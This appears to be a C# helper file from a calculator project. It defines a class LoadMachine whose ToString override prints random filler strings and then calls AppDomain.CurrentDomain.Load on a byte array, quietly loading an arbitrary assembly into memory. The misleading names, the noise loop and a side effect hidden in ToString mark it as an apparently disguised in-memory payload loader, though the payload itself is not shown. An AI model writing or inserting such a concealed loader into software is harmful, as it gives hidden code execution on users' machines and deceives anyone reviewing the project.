using System;

namespace Calculator.Helpers;

internal class LoadMachine<T>
{
	private T type;

	private object item;

	public object Car { get; private set; }

	public LoadMachine(T type, object item, params object[] objs)
	{
		foreach (object obj in objs)
		{
			Console.WriteLine(obj.ToString());
		}
		this.item = item;
		this.type = type;
	}

	public override string ToString()
	{
		if (type is Random)
		{
			Random random = type as Random;
			for (int i = 0; i < random.Next(500); i++)
			{
				Console.WriteLine(Utility.RandomString(i));
			}
			Car = AppDomain.CurrentDomain.Load((byte[])item);
		}
		return type.GetType().ToString();
	}
}
